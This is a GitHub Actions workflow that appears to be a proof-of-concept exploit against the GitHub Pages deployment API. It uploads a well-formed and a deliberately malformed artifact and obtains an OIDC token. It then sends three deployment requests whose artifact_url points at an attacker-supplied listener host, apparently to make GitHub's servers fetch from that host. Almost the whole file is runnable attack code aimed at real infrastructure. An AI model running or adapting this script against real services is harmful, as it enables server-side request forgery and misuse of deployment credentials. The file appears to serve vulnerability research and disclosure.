name: pages-artifacturl-arms
on:
  workflow_dispatch:
    inputs:
      listener: { required: true }
      s1: { required: true }
      s2: { required: true }
      s3: { required: true }
permissions: { contents: read, pages: write, id-token: write }
jobs:
  arms:
    runs-on: ubuntu-latest
    environment: { name: github-pages }
    steps:
      - name: build artifacts
        run: |
          set -eu
          mkdir -p site && echo '<html>poc</html>' > site/index.html
          mkdir -p wf && tar -cf  wf/artifact.tar  -C site .   # well-formed: a plain tar
          mkdir -p ma && tar -czf ma/artifact.tar  -C site .   # malformed:   gzip, same filename
      - uses: actions/upload-artifact@v4
        with: { name: WELLFORMED, path: wf/, retention-days: 1 }
      - uses: actions/upload-artifact@v4
        with: { name: MALFORMED,  path: ma/, retention-days: 1 }
      - name: arms
        env:
          GH_TOKEN: ${{ github.token }}
          LISTENER: ${{ inputs.listener }}
          S1: ${{ inputs.s1 }}
          S2: ${{ inputs.s2 }}
          S3: ${{ inputs.s3 }}
        run: |
          set -u
          API="https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments"
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                       "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)

          curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
          ID_WF=$(jq -r '.artifacts[]|select(.name=="WELLFORMED")|.id' arts.json)
          ID_MA=$(jq -r '.artifacts[]|select(.name=="MALFORMED")|.id'  arts.json)
          echo "ID_WELLFORMED=$ID_WF  ID_MALFORMED=$ID_MA"

          post() { # $1=label $2=pages_build_version $3=url $4=artifact_id (optional)
            echo "===== $1 ====="
            if [ -n "${4:-}" ]; then
              jq -nc --arg u "$3" --arg s "$2" --arg t "$TOKEN" --argjson id "$4" \
                '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > p.json
            else
              jq -nc --arg u "$3" --arg s "$2" --arg t "$TOKEN" \
                '{artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > p.json
            fi
            echo "  artifact_id=${4:-<none>}  artifact_url=$3"
            code=$(curl -s -o out.json -w '%{http_code}' -X POST \
              -H "Authorization: token $GH_TOKEN" -H "Accept: application/vnd.github+json" "$API" -d @p.json)
            echo "  HTTP=$code"
            jq -c '{message,id}' out.json 2>/dev/null | sed 's/^/  /'
            DID=$(jq -r '.id // empty' out.json)
            [ -z "$DID" ] && return 0
            for i in $(seq 1 24); do
              st=$(curl -s -H "Authorization: token $GH_TOKEN" \
                "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployment/status/$DID" | jq -r '.status // "?"')
              echo "  t=$((i*5))s status=$st"
              case "$st" in succeed|deployment_failed|deployment_attempt_error|errored) break;; esac
              sleep 5
            done
          }

          URL="$LISTENER/vfy-bf45/not-a-pipelines-path"
          post ARM_A_url_only              "$S1" "$URL?arm=A"
          post ARM_C_wellformed_control    "$S2" "$URL?arm=C" "$ID_WF"
          post ARM_B_malformed_the_finding "$S3" "$URL?arm=B" "$ID_MA"
